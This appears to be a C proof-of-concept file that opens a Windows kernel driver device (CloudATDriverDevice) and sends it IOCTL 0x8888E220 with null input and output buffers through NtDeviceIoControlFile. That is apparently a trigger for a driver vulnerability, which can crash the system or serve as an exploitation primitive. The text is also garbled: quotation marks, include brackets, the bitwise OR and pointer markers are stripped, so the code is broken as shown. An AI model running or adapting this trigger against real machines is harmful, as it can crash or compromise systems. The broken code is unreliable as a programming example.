#include windows.h
#include stdio.h
#include Psapi.h
#include profileapi.h

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    } DUMMYUNIONNAME;
    ULONG_PTR Information;
} IO_STATUS_BLOCK,  PIO_STATUS_BLOCK;

typedef NTSTATUS(NTAPI NtDeviceIoControlFile)(
    HANDLE           FileHandle,
    HANDLE           Event,
    PVOID            ApcRoutine,
    PVOID            ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG            IoControlCode,
    PVOID            InputBuffer,
    ULONG            InputBufferLength,
    PVOID            OutputBuffer,
    ULONG            OutputBufferLength
    );
PVOID P;
int main() {

    HANDLE hDriver = CreateFileA("\\\\.\\GLOBALROOT\\Device\\CloudATDriverDevice", GENERIC_READ  GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    ULONG dw;
    if (hDriver == INVALID_HANDLE_VALUE) {
        system(pause);
        return(-1);
    }

    LPCWSTR nt = Lntdll;
    HMODULE hntdll = GetModuleHandle(nt);
    IO_STATUS_BLOCK p = {};
    NtDeviceIoControlFile tDeviceIoControl = (NtDeviceIoControlFile)GetProcAddress((HMODULE)hntdll, NtDeviceIoControlFile);
    if (!tDeviceIoControl) {
        printf([-] Fail to resolve ZwDeviceIoControlFile(0x%X)n, GetLastError());
        system(pause);
    }
    DWORD lpFakeBuffer;

    tDeviceIoControl(hDriver, 0, 0, 0, &p, 0x8888E220, 0, 0, 0, 0);
    
    return 0;
}
